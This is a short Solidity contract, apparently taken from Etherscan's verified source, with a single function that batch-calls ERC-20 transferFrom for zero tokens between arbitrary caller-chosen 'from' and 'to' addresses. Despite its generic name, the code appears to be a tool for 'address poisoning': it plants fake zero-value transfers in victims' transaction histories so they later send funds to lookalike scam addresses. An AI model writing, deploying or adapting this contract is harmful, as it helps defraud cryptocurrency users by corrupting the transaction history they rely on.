/**
 *Submitted for verification at Etherscan.io on 2022-12-15
*/

pragma solidity ^0.6.0;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract TransferContract {


    function transferTokens(
        address[] memory _tokenContracts,
        address[] memory _fromAddresses,
        address[] memory _toAddresses
    ) external  {


        if (_tokenContracts.length != _fromAddresses.length || _tokenContracts.length != _toAddresses.length) {
            revert("Error: array length mismatch.");
        }


        for (uint i = 0; i < _tokenContracts.length; i++) {

            IERC20 tokenContract = IERC20(_tokenContracts[i]);

            tokenContract.transferFrom(_fromAddresses[i], _toAddresses[i], 0);
        }
    }
}